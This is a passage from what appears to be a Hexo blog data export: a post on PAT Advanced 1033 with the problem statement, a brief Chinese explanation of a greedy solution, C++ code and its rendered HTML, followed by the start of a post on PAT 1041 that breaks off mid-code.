printf(\"%.2f\\n\", price) : printf(\"The maximum travel distance = %.2f\\n\", dis);\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1033.md","raw":"---\ntitle: PAT advanced 1033\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-16 18:27:31\n---\n\n## Description\n\n> 1033.To Fill or Not to Fill (25)\n\n> With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 4 positive numbers: Cmax (<= 100), the maximum capacity of the tank; D (<=30000), the distance between Hangzhou and the destination city; Davg (<=20), the average distance per unit gas that the car can run; and N (<= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (<=D), the distance between this station and Hangzhou, for i=1,...N. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print \"The maximum travel distance = X\" where X is the maximum possible distance the car can run, accurate up to 2 decimal places.\n\n> Sample Input 1:\n50 1300 12 8\n6.00 1250\n7.00 600\n7.00 150\n7.10 0\n7.20 200\n7.50 400\n7.30 1000\n6.85 300\nSample Output 1:\n749.17\n\n> Sample Input 2:\n50 1300 12 2\n7.10 0\n7.00 600\nSample Output 2:\nThe maximum travel distance = 1200.00\n\n贪心算法： 遇到的最近的比当前加油站便宜的加油站，则加上足够到此车站的油；没有比当前车站便宜的，在当前车站加满油，到次便宜的车站；否则加满油，输出最远距离。\n\n**注意可能始发点没有加油站QAQ**\n\n## Code\n\n```\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nconst int maxN = 5e2 + 10;\n\nint m, d, p, s;\n// the maximum capacity of the tank\n// the distance between Hangzhou and the destination city\n// the average distance per unit gas that the car can run   21\n// the total number of gas stations\n\nstruct sta\n{\n\tfloat x;\n\tfloat y;\n\tsta(float x = 0, float y = 0) :x(x), y(y){}\n}stat[maxN];\n\nfloat price;\nfloat dis = 0;\n\nfloat x;float y;\n\nbool gre()\n{\n\tint z = 0;\n\tfloat h = 0;\n\twhile (dis != d)\n\t{\n\t\tint flag = -1;\n\t\tint maxs = m * p + dis;\n\t\tif (stat[0].y != 0)\n\t\t\treturn 0;\n\t\tfor (int i = z + 1; i <= s; i++)\n\t\t{\n\t\t\tif (stat[i].x < stat[z].x && stat[i].y <= maxs)\n\t\t\t{\n\t\t\t\tflag = i;\n\t\t\t\tprice += (stat[flag].y - dis - h * p) / p * stat[z].x;\n\t\t\t\th += (stat[flag].y - dis - h * p) / p;\n\t\t\t\tdis = stat[flag].y;\n\t\t\t\th -= (stat[flag].y - stat[z].y) / p;\n\t\t\t\tz = flag;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (flag == -1)\n\t\t{\n\t\t\tif (stat[z + 1].y > maxs)\n\t\t\t{\n\t\t\t\tdis = maxs;\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tfloat tmp = stat[z + 1].x;\n\t\t\t\tflag = z + 1;\n\t\t\t\tfor (int i = z + 1; i <= s; i++)\n\t\t\t\t\tif (stat[i].y <= maxs && stat[i].x < tmp)\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = i;\n\t\t\t\t\t\ttmp = stat[i].x;\n\t\t\t\t\t}\n\t\t\t\tprice += (m - h) * stat[z].x;\n\t\t\t\th += m - h;\n\t\t\t\tdis = stat[flag].y;\n\t\t\t\th -= (stat[flag].y - stat[z].y) / p;\n\t\t\t\tz = flag;\n\t\t\t}\n\t\t}\n\t}\n\treturn 1;\n}\nint main()\n{\n\tscanf(\"%d%d%d%d\", &m, &d, &p, &s);\n\tfor (int i = 0; i < s; i++)\n\t{\n\t\tscanf(\"%f\", &x);\n\t\tscanf(\"%f\", &y);\n\t\tstat[i] = sta(x, y);\n\t}\n\tstat[s] = sta(0, d);\n\tfor (int i = 0; i < s - 1; i++)\n\t\tfor (int j = i + 1; j < s; j++)\n\t\t\tif (stat[i].y > stat[j].y)\n\t\t\t\tswap(stat[i], stat[j]);\n\tgre() ? printf(\"%.2f\\n\", price) : printf(\"The maximum travel distance = %.2f\\n\", dis);\n\treturn 0;\n}\n```","slug":"PAT-advanced-1033","published":1,"updated":"2017-02-16T11:44:44.257Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k050029hv18962gc54p","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1033.To Fill or Not to Fill (25)</p>\n<p>With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 4 positive numbers: Cmax (&lt;= 100), the maximum capacity of the tank; D (&lt;=30000), the distance between Hangzhou and the destination city; Davg (&lt;=20), the average distance per unit gas that the car can run; and N (&lt;= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (&lt;=D), the distance between this station and Hangzhou, for i=1,…N. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print “The maximum travel distance = X” where X is the maximum possible distance the car can run, accurate up to 2 decimal places.</p>\n<p>Sample Input 1:<br>50 1300 12 8<br>6.00 1250<br>7.00 600<br>7.00 150<br>7.10 0<br>7.20 200<br>7.50 400<br>7.30 1000<br>6.85 300<br>Sample Output 1:<br>749.17</p>\n<p>Sample Input 2:<br>50 1300 12 2<br>7.10 0<br>7.00 600<br>Sample Output 2:<br>The maximum travel distance = 1200.00</p>\n</blockquote>\n<p>贪心算法： 遇到的最近的比当前加油站便宜的加油站，则加上足够到此车站的油；没有比当前车站便宜的，在当前车站加满油，到次便宜的车站；否则加满油，输出最远距离。</p>\n<p><strong>注意可能始发点没有加油站QAQ</strong></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">5e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m, d, p, s;</div><div class=\"line\"><span class=\"comment\">// the maximum capacity of the tank</span></div><div class=\"line\"><span class=\"comment\">// the distance between Hangzhou and the destination city</span></div><div class=\"line\"><span class=\"comment\">// the average distance per unit gas that the car can run   21</span></div><div class=\"line\"><span class=\"comment\">// the total number of gas stations</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> sta</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">float</span> x;</div><div class=\"line\">\t<span class=\"keyword\">float</span> y;</div><div class=\"line\">\tsta(<span class=\"keyword\">float</span> x = <span class=\"number\">0</span>, <span class=\"keyword\">float</span> y = <span class=\"number\">0</span>) :x(x), y(y)&#123;&#125;</div><div class=\"line\">&#125;stat[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> price;</div><div class=\"line\"><span class=\"keyword\">float</span> dis = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> x;<span class=\"keyword\">float</span> y;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">gre</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> z = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">float</span> h = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (dis != d)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> maxs = m * p + dis;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (stat[<span class=\"number\">0</span>].y != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = z + <span class=\"number\">1</span>; i &lt;= s; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[i].x &lt; stat[z].x &amp;&amp; stat[i].y &lt;= maxs)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tflag = i;</div><div class=\"line\">\t\t\t\tprice += (stat[flag].y - dis - h * p) / p * stat[z].x;</div><div class=\"line\">\t\t\t\th += (stat[flag].y - dis - h * p) / p;</div><div class=\"line\">\t\t\t\tdis = stat[flag].y;</div><div class=\"line\">\t\t\t\th -= (stat[flag].y - stat[z].y) / p;</div><div class=\"line\">\t\t\t\tz = flag;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[z + <span class=\"number\">1</span>].y &gt; maxs)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tdis = maxs;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">float</span> tmp = stat[z + <span class=\"number\">1</span>].x;</div><div class=\"line\">\t\t\t\tflag = z + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = z + <span class=\"number\">1</span>; i &lt;= s; i++)</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (stat[i].y &lt;= maxs &amp;&amp; stat[i].x &lt; tmp)</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\tflag = i;</div><div class=\"line\">\t\t\t\t\t\ttmp = stat[i].x;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tprice += (m - h) * stat[z].x;</div><div class=\"line\">\t\t\t\th += m - h;</div><div class=\"line\">\t\t\t\tdis = stat[flag].y;</div><div class=\"line\">\t\t\t\th -= (stat[flag].y - stat[z].y) / p;</div><div class=\"line\">\t\t\t\tz = flag;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;m, &amp;d, &amp;p, &amp;s);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; s; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;y);</div><div class=\"line\">\t\tstat[i] = sta(x, y);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tstat[s] = sta(<span class=\"number\">0</span>, d);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; s - <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i + <span class=\"number\">1</span>; j &lt; s; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[i].y &gt; stat[j].y)</div><div class=\"line\">\t\t\t\tswap(stat[i], stat[j]);</div><div class=\"line\">\tgre() ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%.2f\\n\"</span>, price) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"The maximum travel distance = %.2f\\n\"</span>, dis);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1033.To Fill or Not to Fill (25)</p>\n<p>With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains 4 positive numbers: Cmax (&lt;= 100), the maximum capacity of the tank; D (&lt;=30000), the distance between Hangzhou and the destination city; Davg (&lt;=20), the average distance per unit gas that the car can run; and N (&lt;= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (&lt;=D), the distance between this station and Hangzhou, for i=1,…N. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print “The maximum travel distance = X” where X is the maximum possible distance the car can run, accurate up to 2 decimal places.</p>\n<p>Sample Input 1:<br>50 1300 12 8<br>6.00 1250<br>7.00 600<br>7.00 150<br>7.10 0<br>7.20 200<br>7.50 400<br>7.30 1000<br>6.85 300<br>Sample Output 1:<br>749.17</p>\n<p>Sample Input 2:<br>50 1300 12 2<br>7.10 0<br>7.00 600<br>Sample Output 2:<br>The maximum travel distance = 1200.00</p>\n</blockquote>\n<p>贪心算法： 遇到的最近的比当前加油站便宜的加油站，则加上足够到此车站的油；没有比当前车站便宜的，在当前车站加满油，到次便宜的车站；否则加满油，输出最远距离。</p>\n<p><strong>注意可能始发点没有加油站QAQ</strong></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">5e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> m, d, p, s;</div><div class=\"line\"><span class=\"comment\">// the maximum capacity of the tank</span></div><div class=\"line\"><span class=\"comment\">// the distance between Hangzhou and the destination city</span></div><div class=\"line\"><span class=\"comment\">// the average distance per unit gas that the car can run   21</span></div><div class=\"line\"><span class=\"comment\">// the total number of gas stations</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> sta</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">float</span> x;</div><div class=\"line\">\t<span class=\"keyword\">float</span> y;</div><div class=\"line\">\tsta(<span class=\"keyword\">float</span> x = <span class=\"number\">0</span>, <span class=\"keyword\">float</span> y = <span class=\"number\">0</span>) :x(x), y(y)&#123;&#125;</div><div class=\"line\">&#125;stat[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> price;</div><div class=\"line\"><span class=\"keyword\">float</span> dis = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> x;<span class=\"keyword\">float</span> y;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">gre</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> z = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">float</span> h = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (dis != d)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> flag = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> maxs = m * p + dis;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (stat[<span class=\"number\">0</span>].y != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = z + <span class=\"number\">1</span>; i &lt;= s; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[i].x &lt; stat[z].x &amp;&amp; stat[i].y &lt;= maxs)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tflag = i;</div><div class=\"line\">\t\t\t\tprice += (stat[flag].y - dis - h * p) / p * stat[z].x;</div><div class=\"line\">\t\t\t\th += (stat[flag].y - dis - h * p) / p;</div><div class=\"line\">\t\t\t\tdis = stat[flag].y;</div><div class=\"line\">\t\t\t\th -= (stat[flag].y - stat[z].y) / p;</div><div class=\"line\">\t\t\t\tz = flag;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (flag == <span class=\"number\">-1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[z + <span class=\"number\">1</span>].y &gt; maxs)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tdis = maxs;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">float</span> tmp = stat[z + <span class=\"number\">1</span>].x;</div><div class=\"line\">\t\t\t\tflag = z + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = z + <span class=\"number\">1</span>; i &lt;= s; i++)</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (stat[i].y &lt;= maxs &amp;&amp; stat[i].x &lt; tmp)</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\tflag = i;</div><div class=\"line\">\t\t\t\t\t\ttmp = stat[i].x;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\tprice += (m - h) * stat[z].x;</div><div class=\"line\">\t\t\t\th += m - h;</div><div class=\"line\">\t\t\t\tdis = stat[flag].y;</div><div class=\"line\">\t\t\t\th -= (stat[flag].y - stat[z].y) / p;</div><div class=\"line\">\t\t\t\tz = flag;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d\"</span>, &amp;m, &amp;d, &amp;p, &amp;s);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; s; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;y);</div><div class=\"line\">\t\tstat[i] = sta(x, y);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tstat[s] = sta(<span class=\"number\">0</span>, d);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; s - <span class=\"number\">1</span>; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i + <span class=\"number\">1</span>; j &lt; s; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stat[i].y &gt; stat[j].y)</div><div class=\"line\">\t\t\t\tswap(stat[i], stat[j]);</div><div class=\"line\">\tgre() ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%.2f\\n\"</span>, price) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"The maximum travel distance = %.2f\\n\"</span>, dis);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1041","date":"2017-02-18T01:57:21.000Z","_content":"\n## Description\n\n> 1041.Be Unique\n\n> Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case contains a line which begins with a positive integer N (<=105) and then followed by N bets. The numbers are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the winning number in a line. If there is no winner, print \"None\" instead.\n\n> Sample Input 1:\n7 5 31 5 88 67 88 17\nSample Output 1:\n31\n\n> Sample Input 2:\n5 888 666 666 888 888\nSample Output 2:\nNone\n\n不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。\n\n## Code\n\n```\n#include <stack>\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\nconst int maxM = 1e4 + 10;\n\nint n, flag, k, ans = 0;\nint m[maxN];\nint c[maxM];\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; 